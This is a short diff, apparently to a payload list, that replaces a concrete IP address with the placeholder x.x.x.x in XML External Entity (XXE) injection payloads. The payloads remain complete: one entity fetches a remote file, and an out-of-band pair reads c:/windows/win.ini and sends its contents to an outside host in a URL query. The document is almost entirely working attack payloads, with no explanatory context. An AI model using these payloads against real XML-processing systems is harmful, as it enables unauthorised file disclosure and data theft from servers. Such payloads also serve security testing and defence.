@@ -1,7 +1,7 @@
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY sp SYSTEM "http://198.211.127.143:443/test.txt">
+<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
 ]>
 <r>&sp;</r>
 
@@ -9,10 +9,10 @@
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "http://198.211.127.143:443/ev.xml">
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
 %sp
 %param1
 ]>
 
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://198.211.127.143:443/?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
